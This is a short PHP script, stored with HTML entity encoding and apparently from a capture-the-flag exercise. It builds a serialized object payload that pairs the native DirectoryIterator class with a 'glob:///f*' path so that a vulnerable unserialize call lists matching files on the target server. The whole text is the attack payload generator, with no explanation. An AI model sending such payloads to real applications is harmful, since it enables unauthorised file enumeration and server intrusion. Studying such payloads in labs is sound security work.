class A
&#123;
    public $a&#x3D;&#39;DirectoryIterator&#39;;
    public $b&#x3D;&#39;glob:&#x2F;&#x2F;&#x2F;f*&#39;;


&#125; 
echo serialize(array(new A, new A));
